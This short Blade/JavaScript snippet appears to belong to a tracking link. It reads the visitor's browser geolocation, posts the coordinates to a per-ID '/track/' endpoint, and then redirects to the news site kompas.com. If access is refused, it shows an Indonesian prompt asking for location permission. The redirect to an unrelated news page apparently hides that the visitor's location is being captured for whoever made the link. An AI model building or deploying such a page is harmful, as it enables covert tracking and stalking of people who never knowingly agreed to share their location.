<script>
    navigator.geolocation.getCurrentPosition(function(position) {
      fetch("/track/{{ $id }}", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-CSRF-TOKEN": "{{ csrf_token() }}"
        },
        body: JSON.stringify({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude
        })
      }).then(res => {
      window.location.href = "https://www.kompas.com/";
        });
    }, function(error) {
      document.querySelector(".info").innerText = "Tidak dapat mengambil lokasi. Harap izinkan akses lokasi.";
    });
  </script>
  